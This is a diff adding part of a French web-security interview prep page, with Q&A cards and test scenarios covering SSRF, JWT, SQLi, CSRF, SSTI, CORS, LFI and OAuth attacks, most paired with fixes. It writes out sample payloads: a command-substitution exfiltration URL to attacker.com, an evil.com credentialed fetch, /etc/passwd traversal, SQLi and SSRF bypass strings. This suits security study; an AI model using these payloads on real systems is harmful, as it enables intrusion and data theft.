+      <div class="qa-answer">Pour un <strong>Blind SSRF</strong>, on utilise des techniques <em>out-of-band</em> : on fait pointer le SSRF vers un serveur sous notre contrôle qui enregistre les connexions entrantes. Outils : <strong>Burp Collaborator</strong> (génère un subdomain unique et notifie), <strong>interactsh</strong> (open source, même principe), ou un simple serveur HTTP/DNS personnel. Workflow : 1) Générer un payload URL unique, 2) Injecter dans le point vulnérable, 3) Observer les callbacks DNS ou HTTP. On peut aussi extraire des données via DNS : <code>http://$(whoami).attacker.com</code> ou via des délais (time-based blind SSRF). Puis mapper le réseau interne en probing des IPs/ports privés et observer les différences de timing ou codes d'erreur.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q08</span><span class="qa-q-text">Explique l'attaque "JWT algorithm confusion" (RS256 → HS256).</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Cette attaque fonctionne quand un serveur utilise RS256 (asymétrique : clé privée signe, clé publique vérifie) mais accepte aussi HS256 (symétrique : même clé pour signer et vérifier). L'attaquant : 1) Récupère la clé publique RSA du serveur (souvent disponible via JWKS endpoint ou exposition publique). 2) Forge un JWT avec <code>alg: HS256</code> et le payload modifié (ex: <code>isAdmin: true</code>). 3) Signe le JWT en HMAC-SHA256 en utilisant la clé <em>publique</em> RSA comme secret. 4) Le serveur, voyant HS256, prend sa clé "secrète" — qui est en réalité sa clé publique — et valide correctement. C'est une confusion algorithme : l'attaquant utilise une donnée publique connue comme secret HMAC. <em>Fix :</em> hardcoder l'algorithme attendu côté serveur, ne pas faire confiance à l'header alg du token.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q09</span><span class="qa-q-text">Quelle est la différence entre une SQLi Union-based et Time-based ? Quand utilises-tu chacune ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>Union-based :</strong> les données extraites sont affichées directement dans la réponse HTTP. On injecte <code>UNION SELECT</code> pour ajouter une ligne avec les données voulues dans le jeu de résultats. Nécessite de connaître le nombre de colonnes et leurs types. <em>Usage :</em> quand on voit les données de la DB dans la page (liste d'articles, profil utilisateur, etc.). <strong>Time-based blind :</strong> aucune donnée visible dans la réponse. On infère les informations bit par bit en mesurant le délai de réponse (SLEEP, WAITFOR). Ex : si le premier caractère du password est 'a', attends 5s → si délai observable, 'a' est correct. <em>Usage :</em> quand l'application n'affiche rien mais est vulnérable (erreurs cachées, réponse binaire ok/ko). Beaucoup plus lent, utilisé en dernier recours.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q10</span><span class="qa-q-text">Comment fonctionne le CSRF et comment le SameSite=Lax le protège-t-il partiellement ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Le <strong>CSRF</strong> exploite le fait que les navigateurs envoient automatiquement les cookies de session avec toute requête vers un domaine, même cross-site. L'attaquant crée une page qui déclenche une requête vers le site cible : le cookie de session de la victime est envoyé automatiquement, et le serveur exécute l'action. <strong>SameSite=Lax</strong> protège en n'envoyant le cookie que pour la navigation de premier niveau (l'utilisateur clique sur un lien → GET). Il bloque les requêtes cross-site initiées par JavaScript (fetch, XMLHttpRequest), les iframes, les images, et les formulaires POST. <em>Limite :</em> SameSite=Lax n'empêche pas le CSRF via des GET qui ont un effet de bord côté serveur (actions déclenchées en GET), ni les attaques impliquant une navigation top-level avec paramètres malveillants.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q11</span><span class="qa-q-text">Qu'est-ce que le SSTI et comment identifies-tu le moteur de templating ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Le <strong>SSTI (Server-Side Template Injection)</strong> se produit quand une entrée utilisateur est directement intégrée dans un template puis rendu par le moteur, au lieu d'être passée comme variable séparée. Pour identifier le moteur : injecter <code>{{7*7}}</code> — si la page affiche 49, c'est probablement Jinja2 ou Twig. Puis <code>{{7*'7'}}</code> : Jinja2 affiche <code>7777777</code> (répétition Python), Twig affiche <code>49</code> (conversion numérique PHP). <code>${7*7}</code> → FreeMarker ou Velocity. <code>&lt;%=7*7%&gt;</code> → ERB (Ruby). Une fois le moteur identifié, on cherche les gadgets d'exécution de code spécifiques au langage. Jinja2 permet de traverser la hiérarchie de classes Python pour atteindre <code>subprocess</code> ou <code>os</code>.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q12</span><span class="qa-q-text">Explique comment une misconfiguration CORS peut mener à un compte compromis.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Si un serveur reflète l'header <code>Origin</code> dans <code>Access-Control-Allow-Origin</code> et répond <code>Access-Control-Allow-Credentials: true</code>, n'importe quel site peut faire des requêtes authentifiées cross-origin et lire les réponses. Attaque : 1) La victime est connectée à <code>bank.com</code>. 2) L'attaquant l'attire sur <code>evil.com</code>. 3) JavaScript sur evil.com fait <code>fetch('https://bank.com/api/account', {credentials:'include'})</code>. 4) Le navigateur envoie les cookies de session de la victime. 5) Le serveur répond avec les données sensibles ET autorise evil.com à les lire. 6) evil.com exfiltre les données vers l'attaquant. <em>Fix :</em> whitelist stricte des origines, ne jamais refléter l'Origin dynamiquement sans validation.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q13</span><span class="qa-q-text">Quels sont les wrappers PHP exploitables en LFI et lesquels peuvent mener à RCE ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><code>php://filter</code> : lecture de fichiers en base64 (utile pour lire le source PHP). <code>php://input</code> : si allow_url_include=On, peut inclure du code PHP depuis le POST body → RCE. <code>data://text/plain;base64,...</code> : injection directe de code PHP encodé → RCE (si allow_url_include=On). <code>zip://</code> et <code>phar://</code> : permettre d'inclure du PHP depuis une archive uploadée → RCE si on peut uploader. <code>expect://</code> : extension rare, exécute des commandes directement. <em>RCE direct sans allow_url_include</em> : log poisoning (injecter du PHP dans les logs Apache/Nginx, puis include le fichier de log), session poisoning (PHP dans User-Agent, include /tmp/sess_xxxx), /proc/self/environ si lisible.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q14</span><span class="qa-q-text">Comment bypasses-tu un filtre anti-SSRF qui blackliste 127.0.0.1 et localhost ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Techniques de bypass : <strong>Représentations alternatives de l'IP :</strong> <code>0177.0.0.1</code> (octal), <code>0x7f000001</code> (hex), <code>2130706433</code> (decimal entier), <code>127.1</code> (notation courte). <strong>IPv6 :</strong> <code>::1</code> ou <code>[::ffff:127.0.0.1]</code>. <strong>DNS wildcard :</strong> <code>127.0.0.1.nip.io</code> (résout en 127.0.0.1), services comme nip.io, xip.io. <strong>Open redirect :</strong> utiliser une URL autorisée qui redirige vers 127.0.0.1. <strong>DNS rebinding :</strong> domaine qui résout d'abord une IP publique (passe la validation) puis 127.0.0.1 lors de la vraie requête. <strong>Encodage URL :</strong> <code>http://localhost%09&#64;evil.com</code>, ambiguïtés de parsing. <strong>Cas réel du CTF (facts.htb) :</strong> ces techniques s'appliquent exactement au bypass de filtres SSRF sur le Media>Import URL.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q15</span><span class="qa-q-text">Qu'est-ce que le Mass Assignment et comment l'exploites-tu ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Le <strong>Mass Assignment</strong> survient quand un framework lie automatiquement les paramètres HTTP aux propriétés d'un objet modèle sans whitelist explicite. Si un modèle User a des champs <code>name, email, isAdmin</code> et que l'endpoint <code>PUT /users/me</code> bind tous les paramètres JSON, un attaquant peut envoyer <code>{"name":"x","isAdmin":true}</code> pour s'octroyer les droits admin. Exemples : Ruby on Rails (attr_accessible), Laravel (fillable/guarded), Spring MVC. <em>En pentest :</em> chercher des champs supplémentaires dans les réponses API (documentation Swagger, source JS) et les inclure dans les requêtes de modification. Tester avec <code>role, isAdmin, is_staff, verified, balance, discount</code>.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q16</span><span class="qa-q-text">Qu'est-ce que le Web Cache Poisoning et quels sont les "unkeyed inputs" typiques ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Le <strong>Web Cache Poisoning</strong> consiste à faire stocker une réponse malveillante dans un cache (CDN, reverse proxy) pour qu'elle soit servie aux utilisateurs suivants. La condition : il faut un <em>unkeyed input</em> — un élément non inclus dans la clé de cache mais qui influence la réponse. <em>Unkeyed inputs courants :</em> <code>X-Forwarded-Host</code> (reflété dans des liens/scripts), <code>X-Forwarded-Scheme</code>, <code>X-Original-URL</code>, paramètres de query non utilisés par l'app mais acceptés, headers de locale/langue, <code>Vary</code> non implémenté. <em>Impact :</em> livraison de JS malveillant à tous les visiteurs (XSS persistant via cache), redirection vers site attaquant, manipulation de contenu statique. <em>Détection :</em> Param Miner (extension Burp) pour découvrir les unkeyed inputs.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q17</span><span class="qa-q-text">Comment sécurises-tu une API REST exposée publiquement ? Cite au moins 8 mesures.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>1. Authentification forte :</strong> OAuth2 + PKCE ou JWT avec expiration courte. <strong>2. Autorisation granulaire :</strong> vérifier côté serveur chaque accès à un objet (BOLA/IDOR). <strong>3. Rate limiting :</strong> par IP et par utilisateur, différencié par endpoint sensible. <strong>4. Input validation :</strong> schéma JSON/XML strict, rejeter les paramètres inconnus. <strong>5. HTTPS uniquement :</strong> HSTS avec preload. <strong>6. Versioning :</strong> désactiver les versions legacy et non maintenues. <strong>7. Minimal disclosure :</strong> erreurs génériques, pas de stack traces, headers serveur minimaux. <strong>8. CORS strict :</strong> whitelist explicite, jamais de wildcard avec credentials. <strong>9. Audit logging :</strong> logger toutes les actions sensibles avec user, IP, timestamp. <strong>10. Désactiver l'introspection GraphQL</strong> en production. <strong>11. Subresource Integrity</strong> pour les scripts tiers. <strong>12. Penetration testing</strong> régulier et bug bounty program.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q18</span><span class="qa-q-text">Explique une attaque OAuth via un open redirect sur redirect_uri. Quelles validations sont insuffisantes ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Dans OAuth, le serveur d'autorisation envoie le <code>code</code> vers la <code>redirect_uri</code>. Si cette URI n'est validée qu'avec une correspondance de préfixe ou regex faible, l'attaquant peut rediriger le code vers son serveur. <em>Validations insuffisantes :</em> vérifier seulement le domaine de base (bypass : <code>trusted.com.evil.com</code>), regex avec anchoring manquant (<code>trusted.com</code> matche <code>trusted.com.evil.com</code>), vérification qui autorise les sous-répertoires sans whitelist complète. <em>Attaque :</em> 1) Créer un lien OAuth avec <code>redirect_uri=https://trusted.com/redirect?next=https://evil.com</code>. 2) Si trusted.com a un open redirect, le code est leaké via Referer ou directement transmis. 3) Échanger le code contre un access_token. <em>Fix :</em> correspondance exacte de la redirect_uri contre une whitelist, pas de regex.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q19</span><span class="qa-q-text">Qu'est-ce que l'insecure deserialization Java ? Comment l'identifies-tu dans le trafic ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Java sérialise les objets en format binaire. L'<strong>insecure deserialization</strong> se produit quand ce binaire est fourni par l'utilisateur et désérialisé sans validation → un attaquant forge un objet malveillant qui exécute du code lors de la désérialisation via des <em>gadget chains</em> (enchaînement de méthodes <code>readObject()</code>). <em>Identification :</em> chercher dans le trafic des valeurs commençant par <code>rO0AB</code> (base64 de <code>AC ED 00 05</code>), présence dans cookies, paramètres POST, headers. Chercher des Content-Type <code>application/x-java-serialized-object</code>. <em>Exploitation :</em> ysoserial génère des payloads pour des gadget chains connues (CommonsCollections, Spring, etc.). <em>Détection :</em> Burp extension "Java Deserialization Scanner". <em>Fix :</em> ne jamais désérialiser des données non fiables, utiliser des lookups de classes blanches (allowlist), signer les données sérialisées.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q20</span><span class="qa-q-text">Quelle est la différence entre XSS stocké et CSRF ? Peuvent-ils être combinés ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>XSS stocké :</strong> injection de JavaScript malveillant exécuté dans le navigateur de la victime dans le contexte de l'application cible. L'attaquant contrôle le JS côté client. <strong>CSRF :</strong> force la victime à effectuer une action non voulue via une requête cross-site, sans exécuter de JS sur la cible. <em>Combinaison XSS+CSRF :</em> très puissante. Un XSS sur le site cible peut contourner toutes les protections CSRF car le JS s'exécute dans la même origine → peut lire les tokens CSRF depuis le DOM, puis les rejouer dans des requêtes forgées. Exemple : XSS lit le CSRF token caché dans le form HTML, forge une requête POST de virement avec ce token valide. C'est pourquoi résoudre XSS est prioritaire sur CSRF : XSS annule la protection CSRF.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q21</span><span class="qa-q-text">Quels sont les grands changements entre OWASP Top 10 2021 et 2025 ? Cite les nouveautés.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>Changements majeurs :</strong> <em>A03 "Software Supply Chain Failures"</em> change radicalement de scope — ce n'est plus seulement "composants vulnérables" mais TOUTE la chaîne : CI/CD, IDEs, registres npm, artifacts, signatures, dépendances transitives. Exemples 2025 : Bybit ($1.5B volés) et le worm npm Shai-Hulud (500+ packages). <em>A10 est une nouvelle catégorie</em> : "Mishandling of Exceptional Conditions" — gestion des erreurs, fail-open, race conditions transactionnelles, expositions via stack traces. <em>SSRF disparaît en tant que catégorie autonome</em> (était A10 en 2021) et est absorbée dans A01 Broken Access Control (CWE-918). <em>A02 Security Misconfiguration remonte de A05 à A02</em>. Le classement reflète des données réelles d'incidence : A01 touche 100% des apps testées.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q22</span><span class="qa-q-text">Qu'est-ce que le "Mishandling of Exceptional Conditions" (A10:2025) et donne des exemples d'exploitation ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">C'est la nouvelle catégorie OWASP 2025 qui regroupe les problèmes de gestion incorrecte des erreurs et conditions anormales. <strong>Fail Open (CWE-636) :</strong> quand une exception se produit dans une vérification d'accès et que le système laisse passer au lieu de bloquer → bypass d'authentification. <strong>Information disclosure via erreurs :</strong> stack traces exposées en production → reconnaissance pour SQLi ou identification du framework. <strong>Race condition transactionnelle :</strong> transaction en 3 étapes (débit → crédit → log) sans rollback atomique → si interruption réseau entre étape 1 et 2, argent débité sans créditer. <strong>Resource exhaustion :</strong> exceptions non catchées laissent des ressources bloquées → DoS progressif. <em>Défense clé :</em> "fail closed" par défaut, erreurs génériques côté client, rollback transactionnel complet, global exception handler.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q23</span><span class="qa-q-text">Qu'est-ce que les ORM Leaks ? Comment exploiter les fonctionnalités de filtrage d'une API REST ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Les <strong>ORM Leaks</strong> (recherche elttam 2025, Top 10 PortSwigger #2) exploitent les opérateurs de filtrage exposés par les ORMs dans les APIs. Contrairement à la SQLi classique, on n'injecte pas de code SQL — on utilise légitimement les opérateurs du framework. Exemple : si une API Django/Prisma expose <code>?email[contains]=admin</code>, un attaquant peut extraire progressivement toutes les données via des filtres successifs (<code>startsWith</code>, <code>endsWith</code>, <code>gt</code>, <code>lt</code>). C'est analogue aux XS-Leaks mais côté serveur. <em>Impact :</em> dump complet de colonnes sensibles (salaires, emails, mots de passe hashés) sans écrire une seule ligne de SQL. <em>Particularité :</em> passe souvent les WAFs car les requêtes sont syntaxiquement correctes. <em>Défense :</em> whitelist stricte des opérateurs de filtrage autorisés, ne pas exposer tous les champs filtrables.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q24</span><span class="qa-q-text">Explique les "Parser Differentials" et comment ils créent des vulnérabilités de sécurité.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Les <strong>Parser Differentials</strong> surviennent quand deux composants d'un système interprètent différemment la même donnée. C'est une surface d'attaque transversale qui se retrouve dans de nombreux protocoles. <em>Exemples concrets :</em> HTTP Request Smuggling (front-end lit Content-Length, back-end lit Transfer-Encoding → même requête, frontières différentes). SAML Fragile Lock (REXML vs Nokogiri lisent des attributs XML différents → bypass de signature). URL parsing (urllib et requests peuvent extraire un host différent pour la même URL → SSRF bypass). Email atom splitting (parseurs SMTP vs OAuth voient des adresses différentes → bypass access control). <em>Principe général :</em> dès qu'une donnée passe par deux composants qui l'interprètent indépendamment, un différentiel peut exister. C'est le #10 des techniques de hacking 2025 selon PortSwigger. <em>Défense :</em> un seul parser de confiance, validation après normalisation, ne pas faire confiance aux composants upstream.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q25</span><span class="qa-q-text">Qu'est-ce que les XS-Leaks (Cross-Site Leaks) ? Donne 2 techniques concrètes de 2025.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">Les <strong>XS-Leaks</strong> exploitent des canaux latéraux dans le navigateur pour inférer des informations cross-origin sans violer directement la SOP — le navigateur révèle indirectement des informations via des comportements observables. <em>Technique 1 — Cross-Origin Redirect Leak (PortSwigger Top 10 #8) :</em> utilise l'algorithme de priorisation du connection-pool de Chrome. Si Chrome optimise les connexions vers un certain hostname, un observer peut déduire vers quel domaine une redirection cross-origin pointe, sans lire la réponse. Cela révèle des URLs internes, tokens dans des redirections, etc. <em>Technique 2 — ETag Length Leak (#6) :</em> exploite les headers ETag pour révéler la taille de la réponse cross-domain via une chaîne d'edge-cases. Utile pour inférer si un contenu existe, sa taille, donc son contenu. <em>Défenses :</em> CORP (Cross-Origin-Resource-Policy), COOP (Cross-Origin-Opener-Policy), SameSite cookies, limiter les informations dans les URLs de redirection.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">Q26</span><span class="qa-q-text">Explique comment la recherche "The Fragile Lock" (PortSwigger, 2025) bypasse l'authentification SAML.</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer">SAML utilise des signatures XML pour garantir l'intégrité des assertions d'identité. La recherche de Zakhar Fedotkin montre que Ruby-SAML (et PHP-SAML) utilisent deux parsers XML différents — REXML pour certaines parties et Nokogiri pour d'autres — créant des inconsistances exploitables. <strong>Attribute Pollution :</strong> <code>ID="attack" samlp:ID="real"</code> — chaque parser lit un attribut différent selon l'ordre et la gestion des namespaces, permettant de faire signer un élément mais en faire valider un autre. <strong>Void Canonicalization (nouvelle technique) :</strong> en ajoutant <code>xmlns:ns="1"</code> (URI relative invalide), la canonicalization de Nokogiri échoue et retourne une string vide au lieu de bloquer. Le DigestValue calculé sur une string vide est prévisible (SHA-256 d'une string vide = valeur connue). L'attaquant peut alors forger une assertion complète qui passe toujours la validation. Résultat : une "Golden SAML Response" qui permet l'account takeover de n'importe quel utilisateur, y compris les admins. <em>Fix :</em> mettre à jour vers ruby-saml ≥ 1.18.0.</div>
+    </div>
+══════════════════════════════════════ -->
+<section class="section" id="scenarios">
+  <div class="section-header">
+    <span class="section-number">SC</span>
+    <h2>Scénarios Pratiques</h2>
+    <span class="badge badge-high">ENTRETIEN AVANCÉ</span>
+  </div>
+
+  <div class="alert alert-info">
+    <span class="alert-icon">🧩</span>
+    <div>Les interviewers posent souvent des scénarios "que ferais-tu si...". Voici les plus courants avec la méthodologie attendue.</div>
+  </div>
+
+  <div class="qa-container">
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">SC1</span><span class="qa-q-text">Tu testes une application et trouves un paramètre qui semble télécharger un fichier : ?file=invoice.pdf. Quelle est ta méthodologie ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>1. Path Traversal :</strong> tenter <code>../../../etc/passwd</code>, <code>....//etc/passwd</code>, encodages URL. <br><strong>2. LFI :</strong> si PHP, tenter des wrappers <code>php://filter/convert.base64-encode/resource=index.php</code>. <br><strong>3. SSRF :</strong> si le paramètre est une URL complète ou peut l'être, tenter <code>http://localhost/</code>, <code>file:///etc/passwd</code>. <br><strong>4. Information disclosure :</strong> tester des chemins connus selon le stack (config.php, .env, web.config, application.properties). <br><strong>5. Wildcard :</strong> tenter <code>*</code>, <code>%00</code> (null byte truncation ancienne vulnérabilité PHP). <br><strong>6. Bypass d'extension :</strong> si seul .pdf est accepté — <code>../../../etc/passwd%00.pdf</code>, <code>../etc/passwd.pdf</code> si la validation est naive. <br><em>Réponse idéale :</em> structurer la démarche, mentionner les encodages, les wrappers PHP, et les impacts possibles de chaque vulnérabilité.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">SC2</span><span class="qa-q-text">Une API retourne {"userId": 1234, "data": ...} et tu es l'utilisateur ID 1234. Comment testes-tu les problèmes d'autorisation ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>IDOR horizontal :</strong> changer userId en 1233, 1235, 1, 0, -1, 9999 et observer les réponses (200 avec données = IDOR). <br><strong>IDOR dans toutes les méthodes :</strong> tester GET, PUT, DELETE, PATCH avec l'ID modifié. <br><strong>GUIDs :</strong> si UUID, chercher où l'UUID d'un autre user est exposé (logs, référence dans d'autres réponses, Wayback Machine). <br><strong>Vertical escalation :</strong> ajouter <code>isAdmin: true</code>, <code>role: "admin"</code> dans les requêtes PUT/PATCH (mass assignment). <br><strong>Accès cross-token :</strong> créer 2 comptes, utiliser le token de l'un pour accéder aux ressources de l'autre. <br><strong>Référence indirecte :</strong> chercher d'autres paramètres qui référencent des objets (orderId, documentId, accountId dans les autres endpoints). <br><strong>Méthode non autorisée :</strong> si GET /admin est 403, tester POST /admin, TRACE /admin, X-HTTP-Method-Override: GET.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">SC3</span><span class="qa-q-text">Tu vois un champ de recherche qui affiche "Résultats pour : [ta requête]". Comment testes-tu XSS et SQLi ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>XSS — étapes :</strong> 1) Tester <code>&lt;b&gt;test&lt;/b&gt;</code> → si bold s'affiche, le HTML passe. 2) Tenter <code>&lt;script&gt;alert(1)&lt;/script&gt;</code>. 3) Si filtré, observer ce qui est encodé/supprimé pour contourner. 4) Analyser le contexte : dans un attribut HTML ? Dans du JS ? Adapter le payload. 5) Tester les variantes : event handlers, SVG, iframe. 6) CSP présente ? Chercher des bypasses. <br><strong>SQLi — étapes :</strong> 1) Injecter <code>'</code> → erreur DB visible ? 2) Tenter <code>' OR 1=1--</code>. 3) Si pas d'erreur, blind : <code>' AND SLEEP(5)--</code>. 4) Déterminer le type de DB (version(), @@version). 5) Compter les colonnes (ORDER BY). 6) UNION SELECT pour extraction. <br><em>Méthode pro :</em> toujours observer d'abord le comportement normal, puis systématiquement caractères spéciaux, puis payloads complets.</div>
+    </div>
+
+    <div class="qa-item" onclick="this.classList.toggle('open')">
+      <div class="qa-question"><span class="qa-number">SC4</span><span class="qa-q-text">Une application utilise des tokens JWT. Quelle est ta checklist complète de tests ?</span><span class="qa-chevron">▼</span></div>
+      <div class="qa-answer"><strong>1.</strong> Décoder le JWT (jwt.io) → analyser header (alg, kid) et payload (rôles, timestamps). <br><strong>2. Algorithm None :</strong> changer <code>alg</code> en <code>none</code>/<code>None</code>/<code>NONE</code>, supprimer la signature. <br><strong>3. Algorithm Confusion RS256→HS256 :</strong> si alg=RS256, récupérer la clé publique et forger en HS256. <br><strong>4. Brute force secret HS256 :</strong> hashcat avec wordlists si le secret est faible. <br><strong>5. Kid injection :</strong> si <code>kid</code> présent, tenter path traversal (<code>../../dev/null</code>), SQL injection. <br><strong>6. jku/x5u :</strong> tenter de pointer vers un JWK externe contrôlé. <br><strong>7. Embedded JWK :</strong> insérer sa propre clé publique dans le header. <br><strong>8. Expiration :</strong> tester des tokens expirés (le serveur les rejette-t-il ?). <br><strong>9. Audience/Issuer :</strong> le serveur valide-t-il ces claims ? <br><strong>10. Réutilisation cross-service :</strong> un token d'un service fonctionne-t-il sur un autre ?</div>
+    </div>
+
+  </div>
+</section>
+
+<!-- ══════════════════════════════════════
+  CHECKLIST
+══════════════════════════════════════ -->
+<section class="section" id="checklist">
+  <div class="section-header">
+    <span class="section-number">✓</span>
+    <h2>Checklist — Préparation Finale</h2>
+    <span class="badge badge-green">À COCHER</span>
+  </div>
+
+  <div class="grid-2">
+    <div class="card card-info">
+      <h4>Concepts à maîtriser</h4>
+      <ul class="checklist" id="cl1">
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>OWASP 2025 : A03 Supply Chain + A10 Exceptional Conditions</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>HTTP (méthodes, headers, 401 vs 403)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>SOP, CORS, CSP, HSTS</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>XSS : 3 types + sources/sinks DOM</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>SQLi : types + différences DB</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>SSRF : cibles cloud + bypasses IP + redirect loops</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>JWT : toutes les attaques</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>OAuth : flows + attaques redirect_uri</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>HTTP Smuggling : CL.TE, TE.CL</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Cookie attributes : HttpOnly, SameSite, etc.</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>SSTI : détection + error-based (PortSwigger #1 2025)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Parser Differentials (XS-Leaks, SAML, HTTP)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>ORM Leaks + Unicode Normalization</span></li>
+      </ul>
+    </div>
+    <div class="card card-success">
+      <h4>Posture & soft skills</h4>
+      <ul class="checklist" id="cl2">
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Structurer sa réponse (STAR si nécessaire)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Dire "je ne sais pas" plutôt que d'inventer</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Parler des contre-mesures après chaque vuln</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Mentionner des tools (Burp, ffuf, nuclei...)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Référencer des ressources (PortSwigger Labs)</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Poser des questions pertinentes à la fin</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Relier les vulns à des CVEs réels si possible</span></li>
+        <li onclick="toggleCheck(this)"><span class="check"></span><span>Montrer une curiosité et veille active</span></li>
+      </ul>
+    </div>
+  </div>
+
+  <div class="alert alert-success" style="margin-top:24px">
+    <span class="alert-icon">🚀</span>
+    <div><strong>Conseil final :</strong> Pour chaque vulnérabilité, mémorise ce triptyque : <em>Comment ça fonctionne</em> → <em>Comment tu l'exploites</em> → <em>Comment tu le corriges</em>. C'est exactement ce qu'un interviewer cherche à entendre.</div>
+  </div>
+
+  <div class="card card-warn" style="margin-top: 16px;">
+    <h4>Questions à poser à ton tour</h4>
+    <ul>
+      <li>Quelle est la stack technologique principale des apps que vous testez ?</li>
+      <li>Est-ce que l'équipe travaille sur du red team ou plutôt du bug bounty / audit ?</li>
+      <li>Quels outils custom avez-vous développé en interne ?</li>
+      <li>Comment se déroule l'onboarding et la montée en compétences ?</li>
+      <li>Quelle est la politique sur la recherche et la publication de CVEs ?</li>
+    </ul>
+  </div>
+</section>
+
+</main>
+</div>
+
+<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js">
+function toggleNav() {
+  document.querySelector('nav').classList.toggle('open');
+  document.getElementById('navOverlay').classList.toggle('open');
+}
+function closeNav() {
+  document.querySelector('nav').classList.remove('open');
+  document.getElementById('navOverlay').classList.remove('open');
+}
+// Close nav on link click (mobile)
+document.querySelectorAll('nav a').forEach(a => a.addEventListener('click', closeNav));
+
+</script><script>
+// Progress bar
